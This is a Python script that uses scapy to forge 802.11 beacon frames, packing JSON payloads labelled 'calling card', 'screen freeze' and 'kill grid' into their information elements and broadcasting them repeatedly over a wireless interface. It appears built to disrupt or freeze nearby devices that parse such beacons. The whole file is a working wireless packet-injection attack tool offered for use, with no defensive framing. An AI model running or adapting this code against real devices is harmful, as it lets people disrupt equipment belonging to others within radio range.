import json
import random
from time import sleep
from scapy.all import *
from hashlib import sha256

CALLING_CARD_PAYLOAD = 0
SCREEN_FREEZE_PAYLOAD = 1
KILL_GRID_PAYLOAD = 2
WIRELESS_INTERFACE = "wlan0"

pwn_packet_path = './data/pwn_packet'
pwn_payload_paths = [
    './payloads/calling_card.json',
    './payloads/screen_freeze.json',
    './payloads/kill_grid.json'
]

def get_payload_data(payload_file_name):
    f = open(payload_file_name)
    data = json.load(f)
    return data

def get_random_identity():
    num = random.random()
    return sha256(str(num).encode('utf-8')).hexdigest()

def get_pwn_packet():
    pwn_packet = rdpcap(pwn_packet_path)
    return pwn_packet[0]

def send_calling_card():
    calling_card_payload = get_payload_data(pwn_payload_paths[CALLING_CARD_PAYLOAD])
    calling_card_payload['identity'] = get_random_identity()
    calling_card_payload_bytes = json.dumps(calling_card_payload).encode()
    print(calling_card_payload_bytes)

    payload_chunks = [calling_card_payload_bytes[i:i+255] for i in range(0, len(calling_card_payload_bytes), 255)]
    packet = get_pwn_packet()

    load_payload_into_packet(packet, payload_chunks)

    send_packet(packet, 10, 2)

def send_screen_freeze():
    calling_card_payload = get_payload_data(pwn_payload_paths[SCREEN_FREEZE_PAYLOAD])
    calling_card_payload['identity'] = get_random_identity()
    calling_card_payload_bytes = json.dumps(calling_card_payload).encode()
    print(calling_card_payload_bytes)

    payload_chunks = [calling_card_payload_bytes[i:i+255] for i in range(0, len(calling_card_payload_bytes), 255)]
    packet = get_pwn_packet()

    load_payload_into_packet(packet, payload_chunks)

    send_packet(packet, 10, 2)
    send_packet(packet, 10, 2)
    send_packet(packet, 10, 2)
    send_packet(packet, 10, 2)
    send_packet(packet, 10, 2)

def send_kill_grid():
    calling_card_payload = get_payload_data(pwn_payload_paths[KILL_GRID_PAYLOAD])
    calling_card_payload_bytes = json.dumps(calling_card_payload).encode()
    print(calling_card_payload_bytes)

    payload_chunks = [calling_card_payload_bytes[i:i+255] for i in range(0, len(calling_card_payload_bytes), 255)]
    packet = get_pwn_packet()

    load_payload_into_packet(packet, payload_chunks)

    send_packet(packet, 5, 2)
    send_packet(packet, 5, 2)
    send_packet(packet, 5, 2)    


def send_packet(packet, play_count, sleep_time):    
    sendp(packet, loop=0, count=play_count, iface=WIRELESS_INTERFACE, verbose=True)
    if(sleep_time > 0):
        sleep(sleep_time)


def set_info_data(elt, data):
    elt.setfieldval('info', data)
    elt.setfieldval('len', len(data))
    return elt

def load_payload_into_packet(packet, payload_chunks):
    beacon_frame = packet[Dot11][Dot11Beacon]

    elt1 = beacon_frame[Dot11Elt]
    elt2 = elt1.payload.getlayer(Dot11Elt)
    elt3 = elt2.payload.getlayer(Dot11Elt)

    set_info_data(elt1, b'')
    set_info_data(elt2, b'')
    set_info_data(elt3, b'')

    last_elt = elt1

    for i in range(0, len(payload_chunks)):
        chunk = payload_chunks[i]
        if i == 0:
            set_info_data(elt1, chunk)
            last_elt = elt1
        if i == 1:
            set_info_data(elt2, chunk)
            last_elt = elt2
        if i == 2:
            set_info_data(elt3, chunk)
            last_elt = elt3
        if i > 2:
            new_elt = Dot11Elt()
            set_info_data(new_elt, chunk)
            last_elt.add_payload(new_elt)
            last_elt = new_elt


send_calling_card()
sleep(5)
send_screen_freeze()
sleep(5)
send_kill_grid()